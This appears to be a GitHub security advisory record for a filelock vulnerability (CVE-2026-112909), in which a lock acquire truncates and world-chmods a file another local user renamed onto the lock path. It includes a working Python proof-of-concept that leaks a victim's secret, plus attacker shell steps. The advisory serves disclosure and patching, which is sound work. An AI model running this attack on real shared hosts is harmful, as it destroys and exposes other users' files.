@@ -1,0 +1,198 @@
+{
+  "id": "GHSA-69hj-f68j-2879",
+  "modified": "2026-10-28T21:15:04.974667790Z",
+  "published": "2026-10-28T21:08:35Z",
+  "aliases": [
+    "CVE-2026-112909"
+  ],
+  "summary": "filelock: UnixFileLock truncates and chmods any regular file another user renames or hard-links onto the lock path",
+  "details": "`UnixFileLock`, the backend of `FileLock` and `AsyncFileLock` on Unix, empties whatever regular file it finds at the lock path once it holds the `flock` (a kernel lock on an open file). With an explicit `mode` it also chmods that file (sets its permission bits), whether or not this acquire created it. Another local user who can rename or hard-link one of the files of the user running the lock (below: the lock user) onto the lock path gets that file truncated by the lock user's next `acquire()`. A hard link is a second name for the same file. With a mode such as `0o666` the file, still owned by the lock user, also becomes readable and writable by that other user. The other user can then read and alter everything the lock user writes to it afterwards.\n\n`O_NOFOLLOW`, the defence added for the symlink variant (CVE-2025-68146), does not see a renamed file or a hard link. The rename route needs the file's directory to be writable without the sticky bit (a directory flag that lets only a file's owner remove or rename it). The hard-link route into a sticky directory such as `/tmp` needs `fs.protected_hardlinks=0`, a Linux kernel setting. Affected versions are every filelock release up to and including 4.2.0 (the truncation is as old as the project; the chmod since 3.10.2).\n\nAnthropic's OSS Scanner reported this in private. Finding covered by this advisory:\n\n- `ANT-2026-KO573NWI` [high, CWE-706]: UnixFileLock truncates and chmods victim files renamed onto the lock path.\n\n## Severity\n\n**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N` scores 6.1 (Medium).**\n\n`AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): one rename or link, then wait for the lock user's next acquire; no race. `I:H` (high integrity impact): the lock user's own process truncates a file it did not mean to touch, including content behind a second name the other user could neither modify nor delete. With a permissive explicit `mode` the other user can then write to it. If that file is one the lock user later executes or trusts, that is code execution as the lock user. `C:L` (partial confidentiality impact): the old content is gone before the other user can read anything, but what the lock user writes afterwards through a descriptor (the number the kernel gives a process for an open file) it still holds is readable. `A:N` (no availability impact). `S:U` (scope unchanged).\n\nClassification from the review: **security, conditional** on another user controlling names in a non-sticky directory on the lock's filesystem (or on `fs.protected_hardlinks=0`). The scanner rated this high. The maintainers score it medium because the reachable targets depend on the directory layout and kernel settings described below.\n\n## Scope and preconditions\n\n- Lock classes: `FileLock` and `AsyncFileLock` on Unix (`UnixFileLock`). `SoftFileLock` applies an explicit mode only to a file it created with `O_CREAT | O_EXCL` and does not truncate an existing file. `WindowsFileLock` has not truncated at any version.\n- The other user must put a regular file of the lock user at the lock path before the lock user's next acquire, while the lock file does not exist yet. That is the case on first use, after a reboot, after a `/tmp` cleaner, or after a release with the default `preserve_lock_file=False`, which unlinks the file. The scanner checked three ways at the scanned commit, with default kernel settings unless stated:\n  - rename inside a directory without the sticky bit (a group-writable project or cache directory, a root-created `0777` directory);\n  - rename from such a directory into a sticky one (`1777`) on the same filesystem. The sticky bit only protects entries that already exist, so the move succeeds while the lock path is free. Once the lock user's lock file exists there, the same move fails with `EPERM`;\n  - `link(2)` into a sticky directory. This needs a system that lets a user hard-link a file it cannot write, which on Linux means `fs.protected_hardlinks=0`. Mainstream distributions set 1, which refuses the link. The scanner did not test macOS or the BSDs.\n- What the lock user loses: with the default `FileLock(path)` the lock truncates the file, which keeps its mode. With an explicit `mode` (a lock shared between users needs `0o666` or `0o660`, because `UnixFileLock` opens the file read-write), the lock also chmods the file to that mode. `_apply_explicit_mode` suppresses `PermissionError` only for files the lock user does not own. The lock user owns its own files, so the `fchmod` succeeds.\n- Trust boundary: the protection against another local user holds only when no other user can rename entries in the lock's directory or, for the rename-into-sticky route, in any directory on the same filesystem that holds a file of the lock user. A user who can rename entries in a non-sticky directory above the lock controls every name below it, which no file-based lock can defend against.\n- Not affected: a symlink (a file that points at another path) at the lock path, because `O_NOFOLLOW` makes the open fail with `ELOOP`; mutual exclusion between cooperating processes.\n\n## Affected code\n\nScanned commit `b831496b0273`: [`UnixFileLock._finalize_locked_fd`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L144-L163), whose [`os.ftruncate` and `_apply_explicit_mode` calls](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L150-L154) have only the `st_nlink != 0` guard (the file still has at least one name); [`_apply_explicit_mode`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L165-L168); [`_open_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L95-L121), which learns from its `O_EXCL` create whether this attempt made the file but hands that flag only to the `ENOSYS` fallback.\n\n## Introduced\n\nThe truncation of whatever is at the lock path dates from the initial commit ([2157efb](https://github.com/tox-dev/filelock/commit/2157efb8b57666699fcf15bf03c3771c1571279c), which opened with `O_TRUNC`). The chmod of a pre-existing inode (the kernel's identity for a file, independent of its name) came with [d7e1e84](https://github.com/tox-dev/filelock/commit/d7e1e84e71ad) \"changed from os.umask to os.chmod\" ([#206](https://github.com/tox-dev/filelock/pull/206), 2023-03-22), first tag 3.10.2 (verified with `git tag --contains`). Before it the code passed the mode only to `open()`, which applies it to a file this call creates. The advisory range is therefore every release up to 4.2.0. The earlier group range `\u003e= 3.10.0` understated it, as the review noted.\n\n## Mechanism\n\n`_open_lock_file` first tries `os.open(path, O_RDWR | O_NOFOLLOW | O_CREAT | O_EXCL, mode)`. With the lock user's file renamed to the lock path that fails with `FileExistsError`. The second `os.open(path, O_RDWR | O_NOFOLLOW)` succeeds, because the entry is a regular file the lock user owns, and returns `created = False`. `_acquire_native` passes `created` only to the `ENOSYS` branch. No process holds a `flock` on the renamed file, so `_lock_fd_nonblocking(fd)` succeeds at once and `_finalize_locked_fd(fd)` runs: `os.fstat`, `st_nlink != 0`, `os.ftruncate(fd, 0)`, then `os.fchmod(fd, mode)` when the lock has an explicit mode. Nothing in that path tells a lock file from any other regular file; a link count of 2 and a non-empty file both pass. `O_NOFOLLOW` does not help because the entry is the file itself (or a hard link, an ordinary directory entry for the same inode), not a symlink to it. There is no race: the other user renames or links once and waits for the next acquire. `AsyncUnixFileLock` inherits `_finalize_locked_fd` unchanged.\n\nThe scanner measured three variants at the same commit, same accounts (`victim` uid 1000, `attacker` uid 1001). First, a rename within a `0777` directory: the next `FileLock(\"jobs.lock\", mode=0o666)` of `victim` empties the `0600` journal of `victim` renamed to `jobs.lock` and sets it to `0666`; `attacker` then reads what `victim` keeps writing through its open descriptor. Second, a rename of a two-name file (`ln /tmp/cache/blob ~/env/blob`, `0644`) from a `0777` directory, `fs.protected_hardlinks=1`: after `mv /tmp/cache/blob /tmp/cache/app.lock` and `FileLock(\"/tmp/cache/app.lock\", mode=0o666)` as `victim`, `~/env/blob` has `2 links, mode 666, 0 bytes` and `echo pwned \u003e\u003e /home/victim/env/blob` as `attacker` succeeds, in a directory `attacker` cannot write. Third, `os.link(notes, lock_path)` in a `1777` directory with `fs.protected_hardlinks=0`: `notes.txt` (`0644`, in the home of `victim`) ends up 0 bytes with mode `0666`, and `open(notes, \"w\")` as `attacker` then succeeds. With plain `FileLock(lock_path)` a `0600` file ends up empty with its mode unchanged. The planted name stays after release, so every later acquire truncates the file again.\n\n## Reproduction\n\nThe scanner's reproducer for `ANT-2026-KO573NWI`, quoted as received. It ran against commit `b831496b0273`.\n\n**`repro`**\n\n```python\n#!/usr/bin/env python3\nimport os\nimport secrets\nimport shutil\nimport stat\nimport subprocess\nimport sys\n\n# set up: a directory every user may write, without the sticky bit\nshared = \"/tmp/renamed-lock-file-demo\"\nshutil.rmtree(shared, ignore_errors=True)\nos.mkdir(shared)\nos.chmod(shared, 0o777)\njournal = f\"{shared}/victim-journal.log\"\nlock_path = f\"{shared}/jobs.lock\"\n\nvictim = subprocess.Popen(\n    [\"runuser\", \"-u\", \"victim\", \"--\", sys.executable, \"/tmp/repro.d/victim_job_runner.py\", shared],\n    stdin=subprocess.PIPE,\n    stdout=subprocess.PIPE,\n    text=True,\n)\n\n\ndef victim_runs(job):\n    victim.stdin.write(job + \"\\n\")\n    victim.stdin.flush()\n    assert victim.stdout.readline() == \"done\\n\"\n\n\ndef as_attacker(script, argument):\n    command = [\"runuser\", \"-u\", \"attacker\", \"--\", sys.executable, f\"/tmp/repro.d/{script}\", argument]\n    return subprocess.run(command, capture_output=True, text=True, check=True).stdout\n\n\n# before the attack: one job leaves the lock file and a 0600 journal with one line in it\nvictim_runs(\"job 1\")\njournal_before = os.stat(journal)\njournal_content_before = open(journal).read()\nattacker_read_before = as_attacker(\"attacker_read_file.py\", journal)\nprint(\n    f\"CONTROL  journal: inode {journal_before.st_ino}, uid {journal_before.st_uid}, \"\n    f\"mode {stat.S_IMODE(journal_before.st_mode):o}, content {journal_content_before!r}\"\n)\nprint(f\"CONTROL  attacker reads the journal: {attacker_read_before!r}\")\n\n# attack\nas_attacker(\"attacker_rename_journal.py\", shared)\n\n# the victim takes its lock again, then notes a secret in its journal through the descriptor it holds\nsecret = secrets.token_hex(8)\nvictim_runs(f\"job 2 {secret}\")\nvictim.stdin.close()\nvictim.wait()\n\n# check: the victim's private journal must not be emptied, widened to 0666, or readable by the attacker\nlock_after = os.stat(lock_path)\nlock_content_after = open(lock_path).read()\nattacker_read_after = as_attacker(\"attacker_read_file.py\", lock_path)\nprint(\n    f\"OBSERVED lock path: inode {lock_after.st_ino}, uid {lock_after.st_uid}, \"\n    f\"mode {stat.S_IMODE(lock_after.st_mode):o}, content {lock_content_after!r}\"\n)\nprint(f\"OBSERVED attacker reads the lock path: {attacker_read_after!r}\")\n\nattacker_was_denied = attacker_read_before == \"permission denied\\n\"\nlock_path_is_the_journal = (lock_after.st_dev, lock_after.st_ino) == (journal_before.st_dev, journal_before.st_ino)\njournal_was_emptied = \"job 1\" in journal_content_before and \"job 1\" not in lock_content_after\njournal_was_widened = stat.S_IMODE(journal_before.st_mode) == 0o600 and stat.S_IMODE(lock_after.st_mode) == 0o666\nattacker_reads_the_secret = secret in attacker_read_after\nbug = (\n    attacker_was_denied\n    and lock_path_is_the_journal\n    and journal_was_emptied\n    and journal_was_widened\n    and attacker_reads_the_secret\n)\nprint(\"BUG\" if bug else \"OK\")\n```\n\n**`repro.d/attacker_read_file.py`**\n\n```python\nimport sys\n\ntry:\n    print(open(sys.argv[1]).read(), end=\"\")\nexcept PermissionError:\n    print(\"permission denied\")\n```\n\n**`repro.d/attacker_rename_journal.py`**\n\n```python\nimport os\nimport sys\n\nshared_directory = sys.argv[1]\n\n# needs only write access to the directory: no sticky bit, so any user may rename any entry in it\nos.rename(f\"{shared_directory}/victim-journal.log\", f\"{shared_directory}/jobs.lock\")\n```\n\n**`repro.d/victim_job_runner.py`**\n\n```python\nimport os\nimport sys\n\nfrom filelock import FileLock\n\nshared_directory = sys.argv[1]\n\njournal_fd = os.open(f\"{shared_directory}/victim-journal.log\", os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)\n# UnixFileLock opens the lock file O_RDWR, so a lock that other users of the directory also take needs mode=0o666\nlock = FileLock(f\"{shared_directory}/jobs.lock\", mode=0o666, timeout=5)\n\nfor job in sys.stdin:\n    with lock:\n        os.write(journal_fd, f\"ran {job}\".encode())\n    print(\"done\", flush=True)\n```\n\n## Attack sequence\n\n```mermaid\nsequenceDiagram\n    participant A as other account\n    participant D as shared directory (writable, not sticky)\n    participant V as lock user: FileLock(\"jobs.lock\", mode=0o666)\n    participant K as kernel\n    Note over V,D: victim-journal.log, owner victim, mode 0600 (the other account cannot read it)\n    A-\u003e\u003eD: mv victim-journal.log jobs.lock (one rename, no race)\n    V-\u003e\u003eK: open(jobs.lock, O_RDWR|O_NOFOLLOW|O_CREAT|O_EXCL) -\u003e EEXIST\n    V-\u003e\u003eK: open(jobs.lock, O_RDWR|O_NOFOLLOW) -\u003e fd (regular file, created=False)\n    V-\u003e\u003eK: flock(fd, LOCK_EX|LOCK_NB) -\u003e ok (no holder)\n    rect rgb(255, 214, 214)\n        V-\u003e\u003eK: fstat(fd), st_nlink != 0\n        V-\u003e\u003eK: ftruncate(fd, 0)\n        V-\u003e\u003eK: fchmod(fd, 0o666)\n        Note over V,K: the journal's inode is now empty and world read-write, still owned by victim\n    end\n    V-\u003e\u003eK: write(\"ran job 2 \u003csecret\u003e\") through the journal descriptor it still holds\n    A-\u003e\u003eD: read jobs.lock -\u003e \"ran job 2 \u003csecret\u003e\"\n```\n\n## Evidence\n\nThe scanner reproducer (`victim` and `attacker` accounts, root-created `0777` directory without the sticky bit under `/tmp`, default sysctls, Linux 6.1, CPython 3.14.8, overlayfs; lock `FileLock(path, mode=0o666, timeout=5)`). It printed `CONTROL journal: inode 296383, uid 1000, mode 600, content 'ran job 1\\n'` and `CONTROL attacker reads the journal: 'permission denied\\n'`. After the rename and the second job of `victim` it printed `OBSERVED lock path: inode 296383, uid 1000, mode 666, content 'ran job 2 f4bc9a4e04c3f556\\n'` and `OBSERVED attacker reads the lock path: 'ran job 2 f4bc9a4e04c3f556\\n'`, last line `BUG`. The verdict requires that the earlier read by `attacker` failed, that the lock path is the journal's inode, that the old line is gone, that the mode went from `0600` to `0666`, and that the later read by `attacker` contains the secret. It runs in under a second with no race. The scanner ran the two-name and `link(2)` variants above by hand at the same commit (commands and results in its report), not through the script.\n\nMaintainer triage: the reproducer prints `BUG` on the scanned commit `b831496` and on the 4.2.0 release image. The independent review (`soft-open`) confirmed the mechanism and that the hard-link and two-name variants go through the same two calls.\n\n## Impact\n\nThe file's content is lost in every configuration, including for processes that hold the file open and under every other name the file has. With an explicit permissive `mode`, the other user can read and modify everything the lock user writes afterwards, while the file still belongs to the lock user. The other user can rename the file back to its old name after the acquire. It stays there with the lock's mode, and the lock user's next acquire creates a fresh lock file.\n\nSomebody who may rename a single-name file may also unlink it, so losing such a file under its name is not new. What the lock adds are two operations on the inode that the other user cannot perform, `ftruncate` and `fchmod`, run with the lock user's privileges. Those matter for a descriptor the lock user still holds, for a second name of the file, and for programs that trust the file's ownership. The other user does not choose the mode, and the lock user writes no bytes the other user chose. Mutual exclusion is not affected.\n\n## Workarounds\n\n- Keep the lock file in a directory no other account can write, or in a sticky directory on a filesystem where no directory holding the lock user's files is writable by others. On Linux keep `fs.protected_hardlinks=1` (the default on mainstream distributions), which closes the hard-link route.\n- Do not pass a permissive explicit `mode` (`0o666`, `0o660`, `0o644`) unless accounts share the lock; without a mode the exposure is the truncation only.\n- Keep the lock file in place (`preserve_lock_file=True`). Once a lock file owned by the lock user exists in a sticky directory, another user cannot rename or link over it.\n- Where the lock does not need `flock` semantics, `SoftFileLock` applies its mode only to the marker it created with `O_EXCL` and does not truncate an existing file.\n\n## Patched version\n\n4.2.1.\n\nFix: https://github.com/tox-dev/filelock/pull/835\n\n## Credits\n\nReported by Anthropic's OSS Scanner (automated analysis), 15 October 2026; reviewed by the maintainers.\n\n- 2026-10-15 23:08 UTC: report received (36 findings; this one rated high by the scanner)\n- 2026-10-16 00:46 UTC: draft advisory created (first as a group of four findings, then narrowed to `ANT-2026-KO573NWI`; the other three security findings have their own advisories)\n- 2026-10-16 01:16 UTC: fix PR #835 opened",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "filelock",
+        "purl": "pkg:pypi/filelock"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.2.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "2.0.0",
+        "2.0.1",
+        "2.0.10",
+        "2.0.11",
+        "2.0.12",
+        "2.0.13",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "3.0.0",
+        "3.0.10",
+        "3.0.12",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.0.6",
+        "3.0.8",
+        "3.0.9",
+        "3.1.0",
+        "3.10.0",
+        "3.10.1",
+        "3.10.2",
+        "3.10.3",
+        "3.10.4",
+        "3.10.5",
+        "3.10.6",
+        "3.10.7",
+        "3.11.0",
+        "3.12.0",
+        "3.12.1",
+        "3.12.2",
+        "3.12.3",
+        "3.12.4",
+        "3.13.0",
+        "3.13.1",
+        "3.13.2",
+        "3.13.3",
+        "3.13.4",
+        "3.14.0",
+        "3.15.0",
+        "3.15.1",
+        "3.15.2",
+        "3.15.3",
+        "3.15.4",
+        "3.16.0",
+        "3.16.1",
+        "3.17.0",
+        "3.18.0",
+        "3.19.1",
+        "3.2.0",
+        "3.2.1",
+        "3.20.0",
+        "3.20.1",
+        "3.20.2",
+        "3.20.3",
+        "3.20.4",
+        "3.21.0",
+        "3.21.1",
+        "3.21.2",
+        "3.22.0",
+        "3.23.0",
+        "3.24.0",
+        "3.24.1",
+        "3.24.2",
+        "3.24.3",
+        "3.25.0",
+        "3.25.1",
+        "3.25.2",
+        "3.28.0",
+        "3.29.0",
+        "3.29.1",
+        "3.29.2",
+        "3.29.3",
+        "3.29.4",
+        "3.29.5",
+        "3.29.6",
+        "3.29.7",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.30.0",
+        "3.30.1",
+        "3.30.2",
+        "3.30.3",
+        "3.31.0",
+        "3.31.1",
+        "3.31.2",
+        "3.32.0",
+        "3.32.2",
+        "3.32.3",
+        "3.32.4",
+        "3.32.5",
+        "3.32.6",
+        "3.32.7",
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "3.5.0",
+        "3.5.1",
+        "3.6.0",
+        "3.7.0",
+        "3.7.1",
+        "3.8.0",
+        "3.8.1",
+        "3.8.2",
+        "3.9.0",
+        "3.9.1",
+        "4.0.0",
+        "4.0.1",
+        "4.0.10",
+        "4.0.11",
+        "4.0.12",
+        "4.0.2",
+        "4.0.3",
+        "4.0.4",
+        "4.0.5",
+        "4.0.6",
+        "4.0.7",
+        "4.0.8",
+        "4.0.9",
+        "4.1.0",
+        "4.1.1",
+        "4.1.2",
+        "4.2.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 4.2.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-69hj-f68j-2879/GHSA-69hj-f68j-2879.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tox-dev/filelock/security/advisories/GHSA-69hj-f68j-2879"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112909"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tox-dev/filelock/pull/835"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tox-dev/filelock/commit/e1e825b1992f69fb6b346dc395d5ae4893536c0a"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tox-dev/filelock"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tox-dev/filelock/releases/tag/4.2.1"
+    }
+  ]
+}
